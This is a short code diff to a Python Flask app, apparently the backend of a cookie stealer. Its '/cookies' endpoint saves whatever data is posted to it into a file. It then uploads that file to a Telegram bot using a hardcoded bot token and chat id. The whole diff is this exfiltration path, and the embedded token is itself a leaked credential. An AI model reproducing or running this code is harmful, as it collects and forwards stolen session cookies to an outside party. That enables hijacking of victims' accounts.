@@ -11,10 +11,9 @@ def hello():
 
 @app.route('/cookies', methods=['POST'])
 def cookies():
-    data = request.get_json()
-    with open('cookies.txt', 'w') as f:
-        f.write('{}\n'.format(data));
-    with open('cookies.txt', 'rb') as f:
+    with open('cookies.json', 'w') as f:
+        f.write('{}\n'.format(request.data));
+    with open('cookies.json', 'rb') as f:
         r = requests.post('https://api.telegram.org/bot1408870234:AAE2GSuLRsf8zo9dAvs3AC0yh89dE_Q13JA/sendDocument', data={'chat_id': 244270350}, files={'document': f})
         print(r.text)
 
